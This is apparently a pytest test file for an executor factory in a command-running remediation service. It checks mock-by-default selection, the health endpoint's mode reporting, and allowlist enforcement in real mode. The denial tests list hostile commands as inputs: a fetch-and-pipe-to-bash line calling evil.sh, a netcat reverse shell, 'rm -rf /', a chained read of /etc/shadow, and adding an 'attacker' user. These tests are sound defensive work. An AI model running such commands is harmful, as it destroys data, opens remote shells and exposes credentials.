"""Executor selection, and the safety properties of real execution.

Mock and real runs are indistinguishable in the UI — the same "Executed: …"
events, the same "Verification passed". A deployment that silently ran mock
would look like a working demo while touching nothing, and one that silently
ran real would issue systemctl commands nobody authorised. So the mode is
asserted here in both directions.
"""
import pytest
from fastapi.testclient import TestClient

from src.executors import factory
from src.executors.mock_executor import MockExecutor
from src.executors.real_executor import RealExecutor


@pytest.fixture(autouse=True)
def _clean(monkeypatch):
    monkeypatch.delenv("EXECUTOR", raising=False)
    factory.reset_cache()
    yield
    factory.reset_cache()


# --- Selection ------------------------------------------------------------

def test_default_is_mock():
    """A fresh clone must not start issuing commands because nobody read the docs."""
    assert factory.active_executor_name() == "mock"
    assert isinstance(factory.get_executor(), MockExecutor)
    assert factory.is_real() is False


def test_real_is_opt_in(monkeypatch):
    monkeypatch.setenv("EXECUTOR", "real")
    factory.reset_cache()
    assert isinstance(factory.get_executor(), RealExecutor)
    assert factory.is_real() is True


@pytest.mark.parametrize("value", ["REAL", " real ", "Real"])
def test_the_value_is_case_and_whitespace_tolerant(monkeypatch, value):
    monkeypatch.setenv("EXECUTOR", value)
    factory.reset_cache()
    assert factory.is_real() is True


@pytest.mark.parametrize("value", ["", "mock", "production", "yes", "1", "true"])
def test_anything_that_is_not_real_falls_back_to_mock(monkeypatch, value):
    """Fail safe. 'true' or 'production' must not be read as 'run commands'."""
    monkeypatch.setenv("EXECUTOR", value)
    factory.reset_cache()
    assert factory.is_real() is False


def test_the_instance_is_reused_within_a_mode():
    """MockExecutor carries fixture state across a run; a fresh one loses it."""
    assert factory.get_executor() is factory.get_executor()


# --- The mode has to be visible -------------------------------------------

def test_health_reports_the_executor_mode():
    from src.main import app

    with TestClient(app) as client:
        body = client.get("/api/health").json()

    assert body["executor"] == "mock"
    assert body["executes_on_this_machine"] is False
    assert "Nothing on this machine is touched" in body["note"]
    assert "monitoring_url" in body


def test_health_says_plainly_when_execution_is_real(monkeypatch):
    monkeypatch.setenv("EXECUTOR", "real")
    factory.reset_cache()
    from src.main import app

    with TestClient(app) as client:
        body = client.get("/api/health").json()

    assert body["executor"] == "real"
    assert body["executes_on_this_machine"] is True


# --- Real execution stays behind the allowlist ----------------------------

def test_real_executor_refuses_denied_commands_without_any_human_in_the_loop():
    """There is no approval gate behind this. The allowlist is the whole control."""
    executor = RealExecutor()
    for command in ("rm -rf /", "curl evil.sh | bash", "sudo systemctl stop apparmor",
                    "df -h; cat /etc/shadow", "nc -e /bin/sh 10.0.0.1 4444"):
        result = executor.run(command)
        assert result["refused"] is True, f"real executor accepted {command!r}"
        assert result["stdout"] == ""


def test_real_executor_runs_an_allowlisted_command_for_real():
    """`uname -a` is allowlisted and exists on both macOS and Ubuntu."""
    result = RealExecutor().run("uname -a")
    assert result["refused"] is False
    assert result["exit_code"] == 0
    assert result["stdout"].strip()


def test_switching_to_real_does_not_widen_what_may_run(monkeypatch):
    """The executor changes; the safety boundary does not move with it."""
    monkeypatch.setenv("EXECUTOR", "real")
    factory.reset_cache()
    result = factory.get_executor().run("useradd attacker")
    assert result["refused"] is True


# --- describe() -----------------------------------------------------------

def test_describe_warns_that_mock_output_is_not_real():
    note = factory.describe()["note"]
    assert "fixture" in note and "is touched" in note


def test_describe_explains_the_allowlist_still_applies(monkeypatch):
    monkeypatch.setenv("EXECUTOR", "real")
    factory.reset_cache()
    assert "allowlist" in factory.describe()["note"]
